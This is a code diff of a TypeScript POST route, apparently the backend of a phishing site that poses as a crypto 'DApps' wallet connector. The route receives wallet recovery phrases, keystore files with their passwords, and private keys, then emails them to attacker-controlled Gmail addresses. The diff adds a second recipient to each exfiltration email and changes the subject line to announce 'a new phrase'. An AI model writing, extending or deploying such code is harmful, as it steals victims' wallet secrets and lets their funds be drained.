@@ -15,22 +15,6 @@ function formatMessage(message: string) {
   return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 }
 
-function formatJsonToHtmlList(obj: {}) {
-  let html = '<ul>';
-
-  for (const [key, value] of Object.entries(obj)) {
-    if (typeof value === 'object' && value !== null) {
-      html += `<li>${key}: ${formatJsonToHtmlList(value)}</li>`;
-    } else {
-      html += `<li>${key}: ${value}</li>`;
-    }
-  }
-
-  html += '</ul>';
-  return html;
-}
-
-
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
@@ -53,8 +37,8 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "sparrowthedev@gmail.com",
-        subject: "Yo! You Just Got A New Phrase Innit!",
+        to: ["sparrowthedev@gmail.com", "soulexmusic24@gmail.com"],
+        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
 
@@ -88,12 +72,12 @@ export async function POST(request: Request) {
         }
       })
 
-      
+
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "sparrowthedev@gmail.com",
-        subject: "Yo! You Just Got A New Phrase Innit!",
+        to: ["sparrowthedev@gmail.com", "soulexmusic24@gmail.com"],
+        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
 
@@ -133,8 +117,8 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "sparrowthedev@gmail.com",
-        subject: "Yo! You Just Got A New Phrase Innit!",
+        to: ["sparrowthedev@gmail.com", "soulexmusic24@gmail.com"],
+        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
 
